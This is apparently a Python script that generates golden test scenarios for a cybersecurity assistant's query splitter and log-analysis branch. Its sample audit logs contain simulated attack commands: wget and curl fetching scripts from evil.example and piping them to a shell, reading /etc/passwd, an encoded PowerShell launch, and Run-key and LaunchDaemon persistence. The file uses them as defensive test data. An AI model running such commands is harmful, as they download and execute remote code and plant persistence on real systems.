"""Build the multi-intent golden scenario set.

A multi-intent *scenario* is one user turn that bundles several things at once:
real cybersecurity questions, conversational chit-chat, keyboard-smash
gibberish, off-topic questions, alias phrasings, typo'd questions, and/or a raw
log paste - in many orderings. The orchestration layer
(orchestration/query_splitter.py + orchestration/multi_intent.py) must split the
turn, drop the noise, and answer each surviving question through the unchanged
pipeline.

Ground truth for every real question is pulled *directly* from
``final_golden_set.json`` (by entry id) so the expected answers never drift from
the canonical golden set - exactly as the single-intent RAGAS run uses. Noise
segments carry an expected disposition (drop / route-and-refuse) instead.

Coverage (see ``category`` on each scenario):
  single baseline, alias single-intent, compound-entity, two/three questions,
  typo + normal, chit-chat/gibberish/off-topic in every position, long
  gibberish, all-noise, all-off-topic, empty turn, raw log (pure), raw log +
  question (swallowed by the log branch), and the max "everything" combination.

Output: ``golden_set_multi_intent.json``. Consumed by
``test_multi_intent_golden.py`` (deterministic split/route/drop regression, no
DB) and feedable to the RAGAS harness for per-segment answer scoring (needs the
live stack; each routed segment is scored against its golden expected_answer).
"""

from __future__ import annotations

import hashlib
import json
import re
from pathlib import Path

HERE = Path(__file__).resolve().parent
GOLDEN_PATH = HERE / "final_golden_set.json"
OUT_PATH = HERE / "golden_set_multi_intent.json"

# One real "original" question per relationship type (diverse retrieval paths).
PICK_TYPES = [
    "technique_mitigation",
    "technique_tactic",
    "group_technique",
    "software_technique",
    "campaign_group",
    "technique_detection_strategy",
]

# Specific entries pulled by id for targeted edge cases.
ALIAS_ID = "software-used-by-campaigns-s0002::reworded"  # "... also known as Mimikatz?"
TYPO_ID = "enterprise-mitigations-t1001::typo"           # "Data Obfusaction" typo

# --- noise libraries -------------------------------------------------------
CHITCHAT = ["hi how are you?", "good morning!", "thanks so much for the help."]
GIBBERISH = [
    "asdfghjkl qwrtplkjhg.",
    "asdfghjkl qwrtplkjhg zxcvbnmqwe lkjhgfdsapoi mnbvcxzlkjhg poiuytrewqzx.",
]
OFFTOPIC = ["what is the capital of France?", "who won the world cup in 2018?"]
# A raw log paste (key=value, multi-line) large enough for the detector to flag
# as a log so the whole turn goes to the deterministic log-analysis branch.
RAW_LOG = (
    "timestamp=2024-01-15T10:22:31Z host=WIN-DC01 process=powershell.exe "
    'parent=winword.exe cmdline="powershell -enc SQBFAFgA" user=admin\n'
    "timestamp=2024-01-15T10:22:33Z host=WIN-DC01 process=cmd.exe "
    'parent=powershell.exe cmdline="whoami /priv" user=admin\n'
    "timestamp=2024-01-15T10:22:35Z host=WIN-DC01 process=net.exe "
    'parent=cmd.exe cmdline="net group \\"Domain Admins\\" /domain" user=admin'
)

# Per-OS log sources. Each MUST be recognized as a raw log (routed to the
# deterministic log-analysis branch) and map to the listed high-confidence
# techniques. Expected values were captured from the analyzer output and
# sanity-checked - the test re-runs detect+parse+analyze and asserts them, so a
# mapping/detector regression on any platform is caught. NOTE: Linux is in
# auditd key=value form on purpose - free-text syslog scores below the raw-log
# detection threshold and would be sentence-split instead of routed.
LOG_SOURCES = {
    "windows": {
        "platform": None,  # generic key=value; ALL_RULES fallback still maps it
        "techniques": ["PowerShell", "Registry Run Keys / Startup Folder", "System Owner/User Discovery"],
        "log": (
            'timestamp=2024-01-15T10:22:31Z host=WIN-DC01 process=powershell.exe '
            'parent=winword.exe cmdline="powershell -enc SQBFAFgA" user=admin\n'
            'timestamp=2024-01-15T10:22:33Z host=WIN-DC01 process=cmd.exe '
            'parent=powershell.exe cmdline="whoami /priv" user=admin\n'
            'timestamp=2024-01-15T10:22:35Z host=WIN-DC01 process=reg.exe '
            'parent=cmd.exe cmdline="reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x" user=admin'
        ),
    },
    "linux": {
        "platform": "linux",
        "techniques": ["Unix Shell", "Cron", "Ingress Tool Transfer"],
        "log": (
            'type=SYSCALL msg=audit(1673778151): comm="bash" exe="/bin/bash" '
            'cmdline="cat /etc/passwd" uid=0 auid=1000\n'
            'type=SYSCALL msg=audit(1673778153): comm="wget" exe="/usr/bin/wget" '
            'cmdline="wget http://evil.example/x.sh -O /tmp/x.sh" uid=0\n'
            'type=SYSCALL msg=audit(1673778155): comm="chmod" exe="/bin/chmod" '
            'cmdline="chmod +x /tmp/x.sh" uid=0\n'
            'type=SYSCALL msg=audit(1673778157): comm="crontab" exe="/usr/bin/crontab" '
            'cmdline="crontab -e" uid=0'
        ),
    },
    "macos": {
        "platform": "macos",
        "techniques": ["AppleScript", "Launch Daemon", "Launchctl"],
        "log": (
            'process=osascript cmdline="osascript -e do shell script whoami"\n'
            'process=launchctl cmdline="launchctl load /Library/LaunchDaemons/com.evil.plist"\n'
            'process=bash cmdline="curl http://evil.example/x | sh"\n'
            'process=bash cmdline="sudo /usr/bin/defaults write com.apple.loginwindow"'
        ),
    },
    "aws": {
        "platform": "aws",
        "techniques": ["Disable or Modify Cloud Log"],
        "log": (
            '{"eventSource":"iam.amazonaws.com","eventName":"CreateUser","userIdentity":{"type":"IAMUser"}}\n'
            '{"eventSource":"s3.amazonaws.com","eventName":"PutBucketPolicy"}\n'
            '{"eventSource":"signin.amazonaws.com","eventName":"ConsoleLogin","responseElements":{"ConsoleLogin":"Success"}}\n'
            '{"eventSource":"cloudtrail.amazonaws.com","eventName":"StopLogging"}'
        ),
    },
}

_ENTRIES = json.loads(GOLDEN_PATH.read_text())["entries"]
_BY_ID = {e["id"]: e for e in _ENTRIES}


def _terminate(question: str) -> str:
    """Ensure a question ends in a splitter boundary char so concatenated
    questions split back into their own segments."""
    q = question.strip()
    return q if re.search(r"[.!?;]$", q) else q + "?"


def _entry_to_q(entry: dict) -> dict:
    return {
        "golden_id": entry["id"],
        "question": _terminate(entry["question"]),
        "expected_answer": entry["expected_answer"],
    }


def _pick_real_questions() -> list[dict]:
    picked: dict[str, dict] = {}
    for e in _ENTRIES:
        rt = e.get("relationship_type")
        if rt in PICK_TYPES and rt not in picked and e.get("variant_kind") == "original":
            picked[rt] = _entry_to_q(e)
    missing = [t for t in PICK_TYPES if t not in picked]
    if missing:
        raise SystemExit(f"golden set missing originals for: {missing}")
    return [picked[t] for t in PICK_TYPES]


def _by_id(entry_id: str) -> dict:
    if entry_id not in _BY_ID:
        raise SystemExit(f"golden set missing entry id: {entry_id}")
    return _entry_to_q(_BY_ID[entry_id])


def _real(q: dict) -> dict:
    return {
        "text": q["question"], "disposition": "route", "reason": "cyber_question",
        "golden_id": q["golden_id"], "expected_answer": q["expected_answer"],
    }


def _noise(text: str, reason: str) -> dict:
    # Off-topic questions route (guardrail soft-refuses); chit-chat/gibberish drop.
    disposition = "route" if reason == "offtopic_question" else "drop"
    return {"text": text, "disposition": disposition, "reason": reason,
            "golden_id": None, "expected_answer": None}


def _log_seg() -> dict:
    return {"text": RAW_LOG, "disposition": "log", "reason": "log",
            "golden_id": None, "expected_answer": None}


def _scenario(sid, category, description, segments, *, raw_log=False, note=None) -> dict:
    routed = [s for s in segments if s["disposition"] == "route"]
    # A raw-log turn is never split: it goes whole to the log branch, so no
    # segment is separately routed and any co-pasted question is "swallowed".
    golden_refs = [] if raw_log else [s for s in segments if s["golden_id"]]
    swallowed = [s["golden_id"] for s in segments if raw_log and s["golden_id"]]
    sc = {
        "id": sid,
        "category": category,
        "description": description,
        "input": "\n".join(s["text"] for s in segments) if raw_log
                 else " ".join(s["text"] for s in segments),
        "raw_log": raw_log,
        "expects_cards": (len(routed) >= 2) and not raw_log,
        "single_fallback": raw_log or len(routed) <= 1,
        "expected_routed_count": 0 if raw_log else len(routed),
        "expected_golden_ids": [s["golden_id"] for s in golden_refs],
        "segments": segments,
    }
    if swallowed:
        sc["swallowed_golden_ids"] = swallowed
    if note:
        sc["note"] = note
    return sc


def build() -> dict:
    q = _pick_real_questions()
    alias = _by_id(ALIAS_ID)
    typo = _by_id(TYPO_ID)
    S = []

    # --- baselines / single-intent (prove multi-intent never touches these) --
    S.append(_scenario(
        "single-real-question", "single_real_question",
        "One real question, no noise -> single path, no cards.",
        [_real(q[0])]))
    S.append(_scenario(
        "single-alias-also-known-as", "alias_single_intent",
        "The exact 'also known as' 156-case: one intent, must NOT split.",
        [_real(alias)],
        note="Regression guard for the additive-adverb clause-starter fix."))
    S.append(_scenario(
        "single-compound-and", "compound_entity_and",
        "Bare 'and' joins compound entities -> one intent, no split.",
        [{"text": "Compare APT29 and Lazarus Group techniques?", "disposition": "route",
          "reason": "cyber_question", "golden_id": None, "expected_answer": None}]))

    # --- clean multi-question turns -----------------------------------------
    S.append(_scenario(
        "multi-two-questions", "two_questions",
        "Two distinct cybersecurity questions -> two cards.",
        [_real(q[0]), _real(q[1])]))
    S.append(_scenario(
        "multi-three-questions", "three_questions",
        "Three distinct cybersecurity questions -> three cards.",
        [_real(q[0]), _real(q[2]), _real(q[4])]))
    S.append(_scenario(
        "multi-typo-plus-normal", "typo_plus_normal",
        "A typo'd question + a normal one; both route, both map to golden.",
        [_real(typo), _real(q[1])]))

    # --- noise in every position --------------------------------------------
    S.append(_scenario(
        "multi-chitchat-then-question", "chitchat_plus_question",
        "Greeting then one real question; greeting dropped, 1 routed.",
        [_noise(CHITCHAT[0], "chitchat"), _real(q[1])]))
    S.append(_scenario(
        "multi-gibberish-then-question", "gibberish_plus_question",
        "Keyboard smash then one real question; gibberish dropped, 1 routed.",
        [_noise(GIBBERISH[0], "gibberish"), _real(q[3])]))
    S.append(_scenario(
        "multi-question-then-gibberish", "question_plus_gibberish",
        "One real question then trailing gibberish; gibberish dropped, 1 routed.",
        [_real(q[2]), _noise(GIBBERISH[0], "gibberish")]))
    S.append(_scenario(
        "multi-long-gibberish-plus-question", "long_gibberish_plus_question",
        "Long keyboard-smash content plus one real question; gibberish dropped.",
        [_noise(GIBBERISH[1], "gibberish"), _real(q[0])]))
    S.append(_scenario(
        "multi-noise-two-questions", "chitchat_gibberish_two_questions",
        "Greeting + gibberish wrapped around two real questions -> two cards.",
        [_noise(CHITCHAT[0], "chitchat"), _real(q[0]),
         _noise(GIBBERISH[1], "gibberish"), _real(q[5])]))

    # --- off-topic handling --------------------------------------------------
    S.append(_scenario(
        "multi-offtopic-plus-question", "offtopic_plus_question",
        "Off-topic question + a real one; both route, off-topic softly refused.",
        [_noise(OFFTOPIC[0], "offtopic_question"), _real(q[4])]))
    S.append(_scenario(
        "multi-all-offtopic", "all_offtopic",
        "Two off-topic questions, no real one; both route -> two refusal cards.",
        [_noise(OFFTOPIC[0], "offtopic_question"), _noise(OFFTOPIC[1], "offtopic_question")]))
    S.append(_scenario(
        "multi-chitchat-offtopic-question", "chitchat_offtopic_question",
        "Greeting (dropped) + off-topic (routed) + real question (routed).",
        [_noise(CHITCHAT[1], "chitchat"), _noise(OFFTOPIC[1], "offtopic_question"), _real(q[3])]))

    # --- all-noise / empty ---------------------------------------------------
    S.append(_scenario(
        "multi-all-noise", "all_noise",
        "Only chit-chat and gibberish; nothing routes -> single fallback.",
        [_noise(CHITCHAT[0], "chitchat"), _noise(GIBBERISH[0], "gibberish"),
         _noise(CHITCHAT[2], "chitchat")]))
    S.append(_scenario(
        "empty-turn", "empty_turn",
        "Empty/whitespace turn -> nothing to route, single fallback.",
        []))

    # --- three real + noise --------------------------------------------------
    S.append(_scenario(
        "multi-three-questions-plus-noise", "three_questions_plus_noise",
        "Three real questions with greeting + gibberish interleaved -> three cards.",
        [_noise(CHITCHAT[0], "chitchat"), _real(q[1]), _real(q[2]),
         _noise(GIBBERISH[0], "gibberish"), _real(q[5])]))

    # --- the max "everything" combination -----------------------------------
    S.append(_scenario(
        "multi-everything", "max_combination",
        "Greeting + gibberish + off-topic + two real questions in one turn.",
        [_noise(CHITCHAT[0], "chitchat"), _noise(GIBBERISH[1], "gibberish"),
         _noise(OFFTOPIC[0], "offtopic_question"), _real(q[0]), _real(q[4])]))

    # --- raw log -------------------------------------------------------------
    S.append(_scenario(
        "raw-log-pure", "raw_log",
        "A raw log paste; must NOT be split - goes to the log-analysis branch.",
        [_log_seg()], raw_log=True))

    # Per-OS logs: each must detect as a raw log AND map to the right techniques.
    for os_name, spec in LOG_SOURCES.items():
        sc = _scenario(
            f"raw-log-{os_name}", "raw_log_platform",
            f"A {os_name} log; must route to the log branch and map to its "
            f"expected ATT&CK techniques.",
            [{"text": spec["log"], "disposition": "log", "reason": "log",
              "golden_id": None, "expected_answer": None}],
            raw_log=True)
        sc["expected_platform"] = spec["platform"]
        sc["expected_techniques"] = spec["techniques"]
        S.append(sc)
    S.append(_scenario(
        "raw-log-plus-question", "raw_log_plus_question",
        "A raw log pasted together with a question; the detector flags the whole "
        "turn as a log, so it is NOT split - the question is handled by the log "
        "branch, not answered as a separate card.",
        [_real(q[0]), _log_seg()], raw_log=True,
        note="Documents the log-branch swallow: mixing a question into a log paste "
             "routes the entire turn to log analysis."))

    payload = {
        "schema_version": "1.1",
        "purpose": (
            "Multi-intent orchestration golden scenarios: split/route/drop "
            "correctness plus per-segment answer ground truth sourced from "
            "final_golden_set.json."
        ),
        "source_golden_artifact": GOLDEN_PATH.name,
        "source_golden_artifact_sha256": hashlib.sha256(GOLDEN_PATH.read_bytes()).hexdigest(),
        "scenario_count": len(S),
        "scenarios": S,
    }
    return payload


if __name__ == "__main__":
    payload = build()
    OUT_PATH.write_text(json.dumps(payload, indent=2) + "\n")
    print(f"wrote {OUT_PATH.name}: {payload['scenario_count']} scenarios")
